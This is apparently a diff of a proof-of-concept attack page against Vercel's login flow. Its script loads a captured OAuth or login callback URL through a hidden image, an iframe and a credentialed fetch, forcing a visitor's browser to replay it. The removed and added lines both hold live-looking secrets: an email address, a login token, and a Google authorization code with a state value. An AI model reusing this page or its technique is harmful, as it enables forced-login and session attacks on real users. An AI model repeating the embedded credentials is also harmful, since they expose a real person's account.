@@ -4,7 +4,7 @@
 <img id="i">
 <iframe id="fr"></iframe>
 <script>
-  const u = "https://vercel.com/login/callback?redirect=server&confirmed=1&email=mk6054353%40gmail.com&loginType=google&mode=login&token=177747ae3f374cea9e98cbbf52fe1ae2&username=mk6054353%40gmail.com";
+  const u = "https://vercel.com/api/registration/google/callback?state=6178f0101a63bd99b6f32bc8afe16d649c8b8d0f193bb2f7211409ecbe49561aae52993a8f6135f1f0d13a1ae33d58b1b79d19cc8381547baba63c34439313e22dc3d8acb4a6bebe1e399ad9d476f8fa5d1c9bb2578c9461da058e384ec6204c885b08e64c0ce43e2f48048bd9aeb24cfea02adb1483a3152ecefaaf842da9dbb3a8f652dd56f9c91d9a5e725e1baec975cd3c6c73e6c2de90350ec048b049dd725f8b38f1927d6c7a9cb79072468df4d89f65a61b3189f8284a5963ea84edf61c35d6e3ce4ea17ca4598787c83b68f27564a7ead8427510ee07bcb71bfccf993007aefff0e2e7e3668b9b618cd879154ff5b1d344d567bc2d8a3c7f175e72&iss=https%3A%2F%2Faccounts.google.com&code=4%2F0AXlqoi7x_UyEMctTZ-w8cfuk3yNx6IMiDSnJF9OGyQSuqy_slSsEvKmcKTz5Jg7PEXeGtA&scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&authuser=0&prompt=none";
   document.getElementById("i").src = u;
   document.getElementById("fr").src = u;
   fetch(u, { credentials: "include", mode: "no-cors" });
